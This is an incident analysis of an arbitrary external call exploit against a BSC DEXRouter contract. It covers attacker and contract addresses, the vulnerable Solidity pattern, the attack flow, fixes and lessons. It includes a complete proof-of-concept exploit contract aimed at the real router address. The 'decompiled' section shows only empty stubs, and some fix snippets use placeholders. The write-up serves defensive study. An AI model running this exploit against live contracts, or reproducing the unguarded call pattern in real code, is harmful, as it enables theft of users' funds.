# DEXRouter Arbitrary External Call Vulnerability — Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | DEXRouter |
| Date | 2023-09-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$4,000 USD |
| Attack Type | Arbitrary External Call |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x09039e2082a0a815908e68bd52b86f96573768e8` |
| Attack Contract | `0x0f41f9146de354e5ac6bb3996e2e319dc8a3bb7f` |
| Vulnerable Contract | `0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7` (DEXRouter) |
| Fork Block | 32,161,325 |

## 2. Vulnerable Code Analysis

The `DEXRouter` contract allowed arbitrary external contract calls via the `functionCallWithValue()` function. In addition, the `update()` function allowed any caller to register their own address in the Router's configuration. By combining these two functions, an attacker could transfer all ETH/BNB held by the Router to themselves.

```solidity
// Vulnerable pattern: arbitrary external call with no validation
contract DEXRouter {
    address public feeReceiver;
    address public liquidityManager;

    // Vulnerable: anyone can update router configuration
    function update(
        address _feeReceiver,
        address _liquidityManager,
        address _swapHelper,
        address _priceOracle
    ) external {
        // No onlyOwner check
        feeReceiver = _feeReceiver;
        liquidityManager = _liquidityManager;
    }

    // Vulnerable: arbitrary call to arbitrary address + arbitrary ETH transfer
    function functionCallWithValue(
        address target,
        bytes calldata data,
        uint256 value
    ) external returns (bytes memory) {
        // No caller validation — anyone can make arbitrary calls using the Router's balance
        (bool success, bytes memory result) = target.call{value: value}(data);
        require(success, "Call failed");
        return result;
    }
}
```

**Vulnerability**: The `update()` function is callable by anyone without access control, and the `functionCallWithValue()` function can transfer the Router contract's balance to any arbitrary target. The attacker registered their own contract via `update()`, then called `functionCallWithValue(address(this), callback_selector, Router.balance)` to drain the Router's entire ETH balance.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// File: DEXRouter_decompiled.sol
    function sellall() external {}  // ❌

// ...

    function withdraw(address account, address recipient, uint256 shares) external {}  // ❌

// ...

    function approve(address account, address recipient, uint256 shares) external returns (bool) {}  // ❌

// ...

    function update(address account, address recipient, address spender, address owner) external {}  // ❌

// ...

    function getHolder(uint256 amount) external view returns (uint256) {}  // ❌
```

## 3. Attack Flow

```
Attacker [0x09039e2082a0a815908e68bd52b86f96573768e8]
  │
  ├─1─▶ DEXRouter.update(
  │          address(this),   // feeReceiver = attacker
  │          address(this),   // liquidityManager = attacker
  │          address(this),   // swapHelper = attacker
  │          address(this)    // priceOracle = attacker
  │      )
  │      [DEXRouter: 0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7]
  │      No access control → all configuration overwritten with attacker's address
  │
  ├─2─▶ DEXRouter.functionCallWithValue(
  │          address(this),                          // target = attacker
  │          abi.encodePacked(this.a.selector),      // attacker callback function
  │          address(DEXRouter).balance              // Router's entire balance
  │      )
  │      → Router transfers ETH to attacker + executes callback
  │
  └─3─▶ ~$4,000 USD profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IDEXRouter {
    function update(
        address feeReceiver,
        address liquidityManager,
        address swapHelper,
        address priceOracle
    ) external;

    function functionCallWithValue(
        address target,
        bytes calldata data,
        uint256 value
    ) external returns (bytes memory);
}

contract DEXRouterExploit {
    IDEXRouter dexRouter = IDEXRouter(0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7);
    bool public received;

    function testExploit() external {
        // 1. Overwrite all configuration to attacker via update() with no access control
        dexRouter.update(
            address(this),
            address(this),
            address(this),
            address(this)
        );

        // 2. Drain Router's entire balance via functionCallWithValue
        dexRouter.functionCallWithValue(
            address(this),
            abi.encodePacked(this.a.selector),
            address(dexRouter).balance  // Router's entire ETH balance
        );
    }

    // Callback function invoked by the Router with ETH
    function a() external payable {
        received = true;
        // ETH is transferred to this contract
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Arbitrary external call, missing access control on configuration update |
| Impact Scope | Entire balance of the DEXRouter contract |
| Explorer | [BSCscan](https://bscscan.com/address/0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7) |

## 6. Security Recommendations

```solidity
// Fix 1: Add onlyOwner to update()
contract DEXRouter {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function update(
        address _feeReceiver,
        address _liquidityManager,
        address _swapHelper,
        address _priceOracle
    ) external onlyOwner {  // Access control added
        feeReceiver = _feeReceiver;
        liquidityManager = _liquidityManager;
    }
}

// Fix 2: Remove functionCallWithValue or apply strict restrictions
// A generic external call function like this is best removed entirely.
// If required, restrict targets to a whitelist.
mapping(address => bool) public approvedTargets;

function functionCallWithValue(
    address target,
    bytes calldata data,
    uint256 value
) external onlyOwner {
    require(approvedTargets[target], "Target not approved");
    require(value <= maxCallValue, "Value too large");
    (bool success,) = target.call{value: value}(data);
    require(success, "Call failed");
}

// Fix 3: TimeLock for configuration changes
uint256 public constant TIMELOCK = 2 days;
mapping(bytes32 => uint256) public pendingChanges;

function proposeUpdate(address _feeReceiver, ...) external onlyOwner {
    bytes32 changeId = keccak256(abi.encode(_feeReceiver, ...));
    pendingChanges[changeId] = block.timestamp + TIMELOCK;
}

function executeUpdate(address _feeReceiver, ...) external onlyOwner {
    bytes32 changeId = keccak256(abi.encode(_feeReceiver, ...));
    require(block.timestamp >= pendingChanges[changeId], "Timelock not expired");
    feeReceiver = _feeReceiver;
    delete pendingChanges[changeId];
}
```

## 7. Lessons Learned

1. **Never expose generic external call functions**: A function like `functionCallWithValue(address, bytes, uint256)` becomes a universal tool for draining contract assets. Such functions must never be exposed publicly without access control.
2. **Identify administrative functions**: Any function that modifies contract configuration — `update()`, `setX()`, `configure()`, etc. — must be restricted to an administrator (`onlyOwner`). The default stance should be "deny."
3. **Risk of ETH held in Router contracts**: When a contract such as a DEX Router holds an ETH balance, any arbitrary-call vulnerability can lead to immediate drainage. Routers should be designed to hold no ETH.
4. **Small BSC DEX pattern**: Small DEXs on BSC are frequently deployed without security audits and often carry basic access control vulnerabilities. The access control on every external function must be reviewed.